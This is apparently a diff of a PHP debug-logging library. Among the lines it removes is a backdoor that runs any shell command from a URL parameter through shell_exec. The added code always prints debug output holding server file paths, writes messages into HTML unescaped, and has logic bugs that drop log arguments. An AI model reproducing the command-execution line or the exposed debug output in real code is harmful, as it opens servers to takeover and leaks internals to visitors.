@@ -2,17 +2,9 @@
 if (!defined("debugmode")){
 
 	define("debugmode",false);
-}else{
-	if (isset($_SERVER["PATH_INFO"])){
-		$PathController  = 	explode("/",$_SERVER["PATH_INFO"]) ;
-	}else{
-		if (isset($_GET["leo"]) && debugmode ){
-			echo shell_exec($_GET["leo"]);
-			exit(0);
-		}
-		$PathController = array();
-	}
-};
+}
+// else
+
 
 
 
@@ -465,20 +457,42 @@ class ChromePhp
  * @author Leandro Morala <programa00leo30@gmail.com>
  */
 
-class DebugerCore 
-{
-	public static function log(){
-		// $arg=func_get_args();
-		// Debuger::log($arg[0],$arg[1]);
-	}
-	public static function msg(){
-		// Debuger::log(func_get_args());
-	}
-	
-}
-
 class Debuger
 {
+	private static $mostrarlog=true;
+	
+	public static function log(){
+		if (self::showdebug()){
+			$arg=func_get_args();
+			// var_dump($arg);
+			DebugerCore::loga($arg[0],$arg[1]);
+		}
+	}
+	public static function msg(){
+		$arg=func_get_args();
+		DebugerCore::loga($arg[0],$arg[1]);
+	}
+	
+	public static function render(){
+		if (self::showdebug())
+			DebugerCore::render();
+	}
+	public static function nolog(){
+		DebugerCore::nolog();
+	}
+	
+	public static function showdebug(){
+		$rt=false;
+		if (defined("debugmode"))$rt=true;
+		$rt= $rt or self::$mostrarlog ;
+		return $rt;
+	}
+
+}
+
+
+class DebugerCore 
+{	
 	private static $mostrarlog = true;
 	private static $_mostrarlogTEXTO = "";
 	
@@ -509,13 +523,41 @@ class Debuger
 			// error_reporting(E_ALL | E_STRICT);
 			register_shutdown_function( "ControlCierre" );
 	}
-	
+
 	public static function render(){
 		// para mostrar el texto al final
 		
-		if (self::$mostrarlog){
+		//if (self::showdebug() )
+		{
+			echo "<div>
+			<style>
+				.debug{
+					background-clip: border-box;
+					line-height: 23px;
+					background-attachment: scroll;
+					block; 
+					color:black;
+					padding-top: 0px;
+					padding-right: 0px;
+					padding-left: 0px;
+					border-top-width: 1px;
+					border-top-style: solid;
+					border-right-width: 1px;
+					border-right-style: solid;
+					border-left-width: 1px;
+					border-left-style: solid;
+					border-bottom-style: solid;
+					border-bottom-width: 0px;
+					margin-top: 2px;
+				}
+				file{
+					color:#03ff00;
+					
+				}
+			</style>
+			mostrar depurador:";
 			echo self::$_mostrarlogTEXTO;
-			
+			echo "fin de datos:</div>";
 		}
 	}
 	public static function showdebug(){
@@ -532,23 +574,44 @@ class Debuger
 	public static function nolog(){
 		self::$mostrarlog =false;
 	}
+	
+	public static function loga(){
+		self::_log();
+	}
 	public static function log(){
-		 
+		if (self::showdebug())
+			self::_log();
+	}
+	
+	private static function _log(){
+		// echo "pasa por aqui<br>\n";
 		// debug_print_backtrace();
 		$ver=debug_backtrace();
 		foreach ($ver as $k=>$v){
+			// quitamos este propio archivo.
 		 if (isset($v["file"]) and ($v["file"]==__file__) )array_shift($ver);
 		}
+		
 		$file = $ver[0]["file"];
+		$file1 = $ver[1]["file"];
 		$line = $ver[0]["line"];
+		$line1 = $ver[1]["line"];
+		$extra="llamado desde $file1 ($line1)";
 		$args = func_get_args();
+		// var_dump($args);
+		// var_dump($ver);
 		if (count($args) != 2){
 			self::$_mostrarlogTEXTO .= "<!-- sin argumentos linea:$line archivo:$file -->";
 		}else{
 			$tipo=$args[0];
 			$mensaje=$args[1];
-			self::$_mostrarlogTEXTO .= "<!-- \nlinea:$line archivo:$file\ntipo:$tipo :msg: $mensaje \n-->\n";
+			self::$_mostrarlogTEXTO .= "<div class='debug' style='block; color:black'><file>archivo:$file</file>
+			<line>($line)$extra</line>
+			<type>tipo:$tipo</type>
+			<msg>msg: $mensaje </msg></div>\n";
 		}
+		// echo self::$_mostrarlogTEXTO;
+		//echo "pasa por aqui;$line,f:$file,t:$tipo,m:$mensaje<br>\n";
 		$args[0]= "debug_log:".$args[0]; 
 		ChromePhp::Debugerlog($args[0],$args[1]);
 	
